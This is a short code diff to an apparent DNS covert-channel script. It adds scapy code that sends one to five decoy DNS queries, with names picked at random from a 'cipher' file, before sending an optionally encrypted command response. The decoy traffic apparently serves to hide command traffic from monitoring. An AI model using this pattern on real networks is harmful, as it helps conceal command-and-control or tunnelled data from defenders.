@@ -110,6 +110,17 @@ def receive_command(local=False, args=None, seq_id=0):
     start_udp_server()
 
 def send_response(response, dns='127.0.0.1', args=None):
+    # Initilize number of random fqdns to be discarded after the command is sent
+    rnd_fqdn = random.randint(1, 5)
+    # pick random fqdn from cipher file
+    for i in range(rnd_fqdn):
+        fqdn_str = random.choice(open(cipher).readlines()).strip()
+        dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
+        dns_req[DNS].id = rnd_fqdn+65530
+        send(dns_req, verbose=0)
+        rnd_fqdn -= 1
+
+
     print('Sender IP:', dns)
     # Encrypt the response
     encrypted_response = encrypt_message(response, key) if args is not None and args.encrypt else response
